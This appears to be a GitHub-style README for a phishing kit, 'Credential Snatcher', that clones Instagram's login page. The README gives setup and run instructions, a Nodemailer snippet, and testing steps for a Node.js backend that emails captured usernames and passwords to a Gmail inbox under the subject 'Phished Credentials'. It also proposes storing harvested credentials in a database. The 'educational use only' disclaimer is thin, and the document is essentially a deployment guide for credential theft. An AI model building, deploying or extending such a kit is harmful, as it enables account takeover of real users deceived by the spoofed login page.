Credential Snatcher : An Instagram clone login system
Overview
The Instagram Clone Login System is an educational web application designed to replicate the login interface of Instagram. It captures user credentials (email/username and password) through a form and sends them to a specified email address using a Node.js backend. This project serves as a learning tool to understand full-stack web development, including front-end design, back-end processing, and email integration using modern technologies like HTML, CSS, JavaScript, Node.js, Express.js, and Nodemailer.
Note: This project is for educational purposes only and should not be used to collect real user credentials or for malicious activities.
Features

Responsive Front-End: A login page mimicking Instagram’s interface, built with HTML and CSS, responsive for desktop and mobile devices.
Form Submission: Captures email/username and password inputs and sends them to the backend via a POST request.
Backend API: A Node.js server using Express.js to handle form submissions and send credentials via email.
Email Integration: Uses Nodemailer to send captured credentials to a configured Gmail address.
Cross-Origin Support: Configured with CORS to allow front-end and back-end communication.

Project Structure
├── index.html          # Front-end login page
├── styles.css          # CSS styles for the login page
├── script.js           # Client-side JavaScript for form submission
├── index.js            # Backend server with Express.js and Nodemailer
├── package.json        # Project dependencies and scripts
├── package-lock.json   # Dependency lock file
└── README.md           # Project documentation

Prerequisites

Node.js: Version 18 or higher (download from nodejs.org).
NPM: Comes with Node.js for managing dependencies.
Gmail Account: A Gmail account with an App Password for Nodemailer.
Internet Connection: Required for installing dependencies and testing email functionality.

Installation

Clone the Repository:
git clone https://github.com/your-username/instagram-clone-login-system.git
cd instagram-clone-login-system

Replace your-username with your actual GitHub username if hosting the project.

Install Dependencies:
npm install


Configure Gmail Credentials:

Create a .env file in the project root (recommended for security):GMAIL_USER=yourgmail@gmail.com
GMAIL_PASS=your-app-password


Alternatively, update index.js with your Gmail address and App Password (not recommended):const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: "yourgmail@gmail.com",
    pass: "yourapppassword",
  },
});


To generate a Gmail App Password, enable 2-Step Verification in your Google Account and follow these instructions.


Add Environment Variables (Optional):

Install the dotenv package:npm install dotenv


Add to index.js:require('dotenv').config();


Use process.env.GMAIL_USER and process.env.GMAIL_PASS in the Nodemailer configuration.



Usage

Start the Server:
npm start

The server runs on http://localhost:5500.

Serve the Front-End:

Open index.html directly in a browser for testing, or use a static file server:npm install -g live-server
live-server


Access the login page at http://localhost:8080 (or the port shown by live-server).


Test the Application:

Enter an email/username and password in the form and click "Enter".
Check the configured Gmail inbox for an email with the subject "Phished Credentials" containing the submitted data.
Monitor the server console for logs (e.g., "Message sent: " or errors).



Scripts

npm start: Runs the server using node index.js.
npm run dev: Runs the server with nodemon for auto-restart during development (requires nodemon installed: npm install -D nodemon).

Testing

Manual Testing:
Use Browser Developer Tools to verify form rendering and network requests.
Use Postman to test the /get-data POST endpoint with payloads like:{ "email": "test@example.com", "password": "test123" }




Unit Testing:
Front-End: Verify form rendering and input field behavior.
Back-End: Test GET / and POST /get-data endpoints, and email delivery with valid/invalid credentials.


Integration Testing:
Ensure form submission triggers a POST request, the server processes it, and an email is sent with correct data.
Test cross-browser compatibility (Chrome, Firefox, Safari) and mobile responsiveness.



Security Considerations

Hardcoded Credentials: Avoid hardcoding Gmail credentials in index.js. Use environment variables (.env) instead.
Input Validation: The current implementation lacks input validation. Add validation to prevent malicious inputs (e.g., using validator.js).
HTTPS: Use HTTPS in production to secure data transmission (not implemented locally).
Rate Limiting: Consider adding rate limiting to prevent API abuse (e.g., using express-rate-limit).
Educational Use Only: Do not deploy this application publicly or use it to collect real user data, as it simulates a phishing scenario for learning purposes.

Future Enhancements

Implement environment variables for secure credential storage.
Add client-side and server-side input validation.
Integrate a database (e.g., MongoDB) to store credentials instead of emailing.
Upgrade to a frontend framework like React for better state management.
Add automated tests using Jest or Cypress.
Enhance UI with animations and transitions.

Troubleshooting

Email Not Sending:
Verify Gmail credentials and App Password are correct.
Ensure Gmail’s "Less secure app access" is not required (use App Password instead).
Check server console for Nodemailer errors.


CORS Errors:
Ensure the front-end is served from an allowed origin or adjust CORS settings in index.js.


Server Not Starting:
Confirm port 5500 is free (netstat -a -n -o on Windows or lsof -i :5500 on Unix).
Check for missing dependencies (npm install).



Contributing
Contributions are welcome! To contribute:

Fork the repository.
Create a feature branch (git checkout -b feature/your-feature).
Commit changes (git commit -m "Add your feature").
Push to the branch (git push origin feature/your-feature).
Open a Pull Request.

License
This project is licensed under the MIT License. See LICENSE for details.
Acknowledgments

Inspired by Instagram’s login interface for educational purposes.
Built with Express.js, Nodemailer, and open-source web technologies.
Thanks to the open-source community for tools and libraries used in this project.
